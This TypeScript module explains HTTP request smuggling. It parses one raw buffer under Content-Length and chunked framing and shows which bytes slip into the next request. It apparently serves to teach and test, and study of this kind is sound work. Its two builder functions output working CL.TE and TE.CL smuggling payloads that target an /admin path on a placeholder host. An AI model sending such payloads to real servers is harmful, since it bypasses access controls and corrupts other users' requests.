// HTTP request smuggling — what happens when two servers in a chain disagree about where one
// request ends and the next begins. An HTTP/1.1 message can declare its body length two ways:
// Content-Length (a byte count) or Transfer-Encoding: chunked (size-prefixed chunks ending in a
// 0-chunk). RFC 9112 §6.1 says if BOTH are present, Transfer-Encoding wins and Content-Length must
// be ignored (a server SHOULD reject the message). When a front-end proxy and the back-end server
// pick DIFFERENTLY, they split the same bytes at different offsets — and the leftover bytes get
// prepended to the next victim's request. We frame the same raw buffer two ways and show exactly
// where each parser stops and which bytes get smuggled across the cut. Pure, tested.

export type Framing = 'CL' | 'TE';

export interface FrameResult {
  framing: Framing;
  bodyStart: number; // byte offset where the body begins (just past the blank line)
  consumed: number; // total bytes this parser treats as ONE request
  valid: boolean; // did the framing parse cleanly?
  note: string;
}

const headerValue = (raw: string, name: string): string | null => {
  const head = raw.slice(0, raw.indexOf('\r\n\r\n'));
  for (const line of head.split('\r\n')) {
    const i = line.indexOf(':');
    if (i > 0 && line.slice(0, i).trim().toLowerCase() === name) return line.slice(i + 1).trim();
  }
  return null;
};

/** Determine the request boundary under one framing interpretation. */
export function frame(raw: string, framing: Framing): FrameResult {
  const he = raw.indexOf('\r\n\r\n');
  const bodyStart = he < 0 ? raw.length : he + 4;
  if (framing === 'CL') {
    const raw_cl = headerValue(raw, 'content-length');
    const cl = parseInt(raw_cl ?? '0', 10);
    return { framing, bodyStart, consumed: bodyStart + (isNaN(cl) ? 0 : cl), valid: raw_cl != null && !isNaN(cl), note: `Content-Length: ${cl} → reads exactly ${cl} body bytes` };
  }
  // chunked: walk size-prefixed chunks until the 0-size terminator
  let p = bodyStart;
  while (p < raw.length) {
    const nl = raw.indexOf('\r\n', p);
    if (nl < 0) return { framing, bodyStart, consumed: raw.length, valid: false, note: 'malformed chunk: no size line' };
    const size = parseInt(raw.slice(p, nl).trim(), 16);
    if (isNaN(size)) return { framing, bodyStart, consumed: raw.length, valid: false, note: 'malformed chunk size' };
    p = nl + 2;
    if (size === 0) { p += 2; return { framing, bodyStart, consumed: p, valid: true, note: 'chunked → ends at the 0-size chunk' }; }
    p += size + 2; // chunk data + its trailing CRLF
  }
  return { framing, bodyStart, consumed: raw.length, valid: false, note: 'chunked → no terminating 0-chunk' };
}

export interface Desync {
  front: FrameResult;
  back: FrameResult;
  kind: 'CL.TE' | 'TE.CL' | 'aligned';
  smuggledStart: number;
  smuggledEnd: number;
  smuggled: string; // the bytes the front-end forwarded that the back-end treats as the NEXT request
  bothPresent: boolean;
  rfcSafe: Framing; // the framing RFC 9112 §6.1 says to use when both headers are present
}

/** Run both parsers over the same bytes and find what gets smuggled across their disagreement. */
export function desync(raw: string, frontFraming: Framing, backFraming: Framing): Desync {
  const front = frame(raw, frontFraming);
  const back = frame(raw, backFraming);
  const lo = Math.min(front.consumed, back.consumed);
  const hi = Math.max(front.consumed, back.consumed);
  const kind = frontFraming === 'CL' && backFraming === 'TE' ? 'CL.TE' : frontFraming === 'TE' && backFraming === 'CL' ? 'TE.CL' : 'aligned';
  return {
    front, back, kind,
    smuggledStart: lo, smuggledEnd: hi, smuggled: raw.slice(lo, hi),
    bothPresent: headerValue(raw, 'content-length') != null && headerValue(raw, 'transfer-encoding') != null,
    rfcSafe: 'TE', // RFC 9112 §6.1: Transfer-Encoding overrides Content-Length
  };
}

/** A CL.TE payload: front-end uses Content-Length (forwards everything), back-end uses chunked
 *  (stops at the 0-chunk), so the trailing bytes are smuggled as the start of the next request. */
export function buildCLTE(): string {
  const smuggled = 'GET /admin HTTP/1.1\r\nHost: victim.example\r\nFoo: ';
  const body = `0\r\n\r\n${smuggled}`;
  return `POST / HTTP/1.1\r\nHost: victim.example\r\nContent-Length: ${body.length}\r\nTransfer-Encoding: chunked\r\n\r\n${body}`;
}

/** A TE.CL payload: front-end uses chunked (reads the whole chunk), back-end uses a small
 *  Content-Length (reads only the chunk-size line), leaving the chunk body as the next request. */
export function buildTECL(): string {
  const smuggled = 'GET /admin HTTP/1.1\r\nHost: victim.example\r\nX: ';
  const hex = smuggled.length.toString(16);
  const body = `${hex}\r\n${smuggled}\r\n0\r\n\r\n`;
  const cl = `${hex}\r\n`.length; // back-end reads only the chunk-size line
  return `POST / HTTP/1.1\r\nHost: victim.example\r\nTransfer-Encoding: chunked\r\nContent-Length: ${cl}\r\n\r\n${body}`;
}
